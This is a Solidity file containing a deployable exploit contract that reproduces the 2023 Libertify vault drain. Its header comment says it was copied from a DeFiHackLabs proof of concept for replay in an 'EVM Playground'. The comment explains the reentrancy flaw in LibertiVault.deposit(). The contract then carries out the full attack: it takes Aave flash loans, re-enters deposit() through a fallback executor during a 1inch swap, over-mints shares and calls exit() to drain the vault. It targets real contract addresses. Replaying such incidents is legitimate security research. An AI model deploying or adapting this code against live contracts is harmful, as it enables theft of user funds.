// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Libertify).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), and the Aave flash-loan callback `executeOperation`
// plus the 1inch swap-executor callback `fallback()` live on the test itself), so
// there is no standalone contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> executeOperation ->
// deposit/exit -> fallback() reentrancy -> WETHToUSDT) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/Libertify_exp.sol.
//
// Root cause: LibertiVault.deposit() snapshots `nav` (net asset value) at the TOP
// of the function, then makes an external call to the 1inch V4 router (userSwap)
// to rebalance the deposit -- and only AFTER that external call does it read
// totalSupply() to compute shares = supply * value / nav. There is no
// nonReentrant guard. 1inch's swap() invokes a caller-supplied
// IAggregationExecutor.callBytes(); the attacker registers its OWN contract as
// that executor (via a bare `fallback()`, not a named selector), so the swap
// re-enters deposit(). The reentrant inner deposit() runs to completion and
// inflates totalSupply(). When the outer call resumes, it computes shares using
// the NEW (inflated) totalSupply() but the OLD (stale, pre-reentrancy) nav --
// massively over-minting shares to the attacker. exit() then burns those shares
// and pays out the vault's WETH/USDT pro-rata to share balance, draining nearly
// the entire vault. The whole sequence is wrapped in an Aave flash loan purely to
// fund the 1inch swap liquidity (5,000,000 USDT); the flash loan is fully repaid
// each round, the profit comes from the vault. Two flash-loan rounds are run.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILibertiVault {
    function deposit(uint256 assets, address receiver, bytes calldata data) external returns (uint256 shares);
    function exit() external returns (uint256 amountToken0, uint256 amountToken1);
}

interface IAggregationExecutor {
    /// @notice Make calls on `msgSender` with specified data
    function callBytes(address msgSender, bytes calldata data) external payable; // 0x2636f7f8
}

interface oneInchV4Router {
    struct SwapDescription {
        IERC20 srcToken;
        IERC20 dstToken;
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
        bytes permit;
    }

    function swap(IAggregationExecutor caller, SwapDescription calldata desc, bytes calldata data)
        external
        payable
        returns (uint256 returnAmount, uint256 spentAmount, uint256 gasLeft);
}

interface Uni_Router_V3 {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

contract LibertifyDrain {
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    ILibertiVault LibertiVault = ILibertiVault(0x9c80a455ecaca7025A45F5fa3b85Fd6A462a447b);
    oneInchV4Router inchV4Router = oneInchV4Router(0x1111111254fb6c44bAC0beD2854e76F90643097d);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    uint256 nonce;

    // entrypoint: approves the vault, then runs two identical Aave flash-loan
    // rounds (each round: deposit-with-reentrancy -> exit -> repay).
    function run() external {
        WETH.approve(address(LibertiVault), type(uint256).max);

        address[] memory assets = new address[](1);
        assets[0] = address(USDT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5_000_000 * 1e6;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        USDT.approve(address(aaveV2), type(uint256).max);

        bytes memory callData = setData();
        LibertiVault.deposit(0.001 ether, address(this), callData); // outer deposit -- nav snapshotted, then 1inch swap re-enters (see fallback())

        LibertiVault.exit(); // burn inflated shares, drain pro-rata WETH/USDT
        if (USDT.balanceOf(address(this)) < (amounts[0] + premiums[0])) {
            WETHToUSDT(amounts[0], premiums[0]);
        }
        return true;
    }

    // 1inch's swap() calls `caller.callBytes(...)` on the attacker-supplied
    // executor. This contract registers ITSELF as that executor (see setData()),
    // but 1inch's real call target here resolves to this contract's bare
    // `fallback()`, not a matching `callBytes` selector -- so the reentrant
    // deposit() fires from inside the undifferentiated fallback path.
    fallback() external payable {
        nonce++;
        if (nonce % 2 == 1) {
            bytes memory callData = setData();
            LibertiVault.deposit(0.001 ether, address(this), callData); // re-enter deposit() during the swap callback -> inflates totalSupply() before the outer deposit reads it
        }
        USDT.transfer(address(inchV4Router), 2_500_000 * 1e6);
    }

    function setData() internal view returns (bytes memory data) {
        // 1inchV4Router.swap(caller, desc, data)
        IAggregationExecutor caller = IAggregationExecutor(address(this));
        oneInchV4Router.SwapDescription memory desc = oneInchV4Router.SwapDescription(
            WETH, USDT, payable(address(this)), payable(address(LibertiVault)), 252_700 * 1e9, 1, 0, ""
        );
        data = abi.encodeWithSelector(bytes4(0x7c025200), caller, desc, new bytes(1));
        return data;
    }

    function WETHToUSDT(uint256 amount, uint256 premium) internal {
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactOutputSingleParams memory _param = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDT),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: amount + premium - USDT.balanceOf(address(this)),
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_param);
    }
}
